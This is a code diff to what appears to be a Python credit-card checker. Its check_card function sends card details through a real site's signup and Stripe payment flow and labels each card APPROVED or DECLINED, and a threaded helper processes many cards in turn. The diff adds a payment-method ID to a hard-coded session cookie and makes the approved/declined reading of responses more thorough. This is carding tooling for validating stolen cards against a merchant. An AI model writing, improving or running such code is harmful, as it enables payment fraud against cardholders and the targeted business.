@@ -98,7 +98,7 @@ def check_card(user_id, card_info):
         'accept-encoding': 'gzip, deflate, br, zstd',
         'accept-language': 'en-US,en;q=0.9',
         'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'cookie': f'cfid=f0999602-b357-441d-bce3-5e8d6861c302; cftoken=0; CF_CLIENT_CRIBFLYER_TC=1747139869662; _gcl_au=1.1.277038344.1747139873; _ga=GA1.2.509374650.1747139873; _gid=GA1.2.90002344.1747139873; __stripe_mid=976d1b11-0e75-48a9-b082-7f34b6ed436aa8eae6; __stripe_sid=e8dd1e23-3b38-4655-951e-e66134f0153e810f76; CF_CLIENT_CRIBFLYER_LV=1747139895458; CF_CLIENT_CRIBFLYER_HC=5; AWSALB=7oWW/ErKPjISa5eaNZseGPkDwIpJvANhyGZNZzp6qHBfBYejcPn4lWGnHO3nhaFig4PbGLu+r7bJH6OChuUHrJgsXISnrZ3XVgvuFq9mO3Pt67Vk67iKzoDAtsKl; AWSALBCORS=7oWW/ErKPjISa5eaNZseGPkDwIpJvANhyGZNZzp6qHBfBYejcPn4lWGnHO3nhaFig4PbGLu+r7bJH6OChuUHrJgsXISnrZ3XVgvuFq9mO3Pt67Vk67iKzoDAtsKl',
+        'cookie': f'cfid=f0999602-b357-441d-bce3-5e8d6861c302; cftoken=0; CF_CLIENT_CRIBFLYER_TC=1747139869662; _gcl_au=1.1.277038344.1747139873; _ga=GA1.2.509374650.1747139873; _gid=GA1.2.90002344.1747139873; __stripe_mid={pm_id}; __stripe_sid=e8dd1e23-3b38-4655-951e-e66134f0153e810f76; CF_CLIENT_CRIBFLYER_LV=1747139895458; CF_CLIENT_CRIBFLYER_HC=5; AWSALB=7oWW/ErKPjISa5eaNZseGPkDwIpJvANhyGZNZzp6qHBfBYejcPn4lWGnHO3nhaFig4PbGLu+r7bJH6OChuUHrJgsXISnrZ3XVgvuFq9mO3Pt67Vk67iKzoDAtsKl; AWSALBCORS=7oWW/ErKPjISa5eaNZseGPkDwIpJvANhyGZNZzp6qHBfBYejcPn4lWGnHO3nhaFig4PbGLu+r7bJH6OChuUHrJgsXISnrZ3XVgvuFq9mO3Pt67Vk67iKzoDAtsKl',
         'origin': 'https://www.cribflyer.com',
         'priority': 'u=1, i',
         'referer': 'https://www.cribflyer.com/signup?p=property_plan&qty=1',
@@ -136,17 +136,45 @@ def check_card(user_id, card_info):
     except Exception as e:
         return f"Error connecting to final API: {str(e)}"
     
-    # Parse and return the response
+    # Parse and return the response - UPDATED HANDLING
+    raw_response = final_response.text
+    
+    # First try to parse as JSON
     try:
-        response_json = final_response.json()
+        response_json = json.loads(raw_response)
         formatted_response = json.dumps(response_json, indent=2)
         
-        if response_json.get("ERROR", True):  # Default to True if ERROR key doesn't exist
-            return f"❌ DECLINED ❌\n\n{formatted_response}"
-        else:
-            return f"✅ APPROVED ✅\n\n{formatted_response}"
+        # Check for ERROR field in JSON
+        if isinstance(response_json, dict) and "ERROR" in response_json:
+            if response_json["ERROR"]:
+                return f"❌ DECLINED ❌\n\n{formatted_response}"
+            else:
+                return f"✅ APPROVED ✅\n\n{formatted_response}"
+        return f"⚠️ UNKNOWN JSON RESPONSE ⚠️\n\n{formatted_response}"
+    
+    except json.JSONDecodeError:
+        # If not JSON, analyze raw text
+        if "ERROR" in raw_response:
+            if "ERROR: true" in raw_response or "ERROR\": true" in raw_response:
+                return f"❌ DECLINED ❌\n\nRaw response:\n{raw_response}"
+            elif "ERROR: false" in raw_response or "ERROR\": false" in raw_response:
+                return f"✅ APPROVED ✅\n\nRaw response:\n{raw_response}"
+        
+        # Check common decline patterns in raw text
+        decline_phrases = ["declined", "failed", "invalid", "not authorized"]
+        if any(phrase.lower() in raw_response.lower() for phrase in decline_phrases):
+            return f"❌ DECLINED ❌\n\nRaw response:\n{raw_response}"
+        
+        # Check common approval patterns
+        approval_phrases = ["success", "approved", "valid"]
+        if any(phrase.lower() in raw_response.lower() for phrase in approval_phrases):
+            return f"✅ APPROVED ✅\n\nRaw response:\n{raw_response}"
+        
+        # If we can't determine, show unknown status
+        return f"⚠️ UNKNOWN RESPONSE ⚠️\n\nRaw response:\n{raw_response}"
+    
     except Exception as e:
-        return f"Error parsing final API response: {str(e)}\n\nRaw response: {final_response.text}"
+        return f"⚠️ PROCESSING ERROR ⚠️\n\nError: {str(e)}\nRaw response:\n{raw_response}"
 
 # Threaded function to process multiple cards with delay
 def process_cards(user_id, cards):
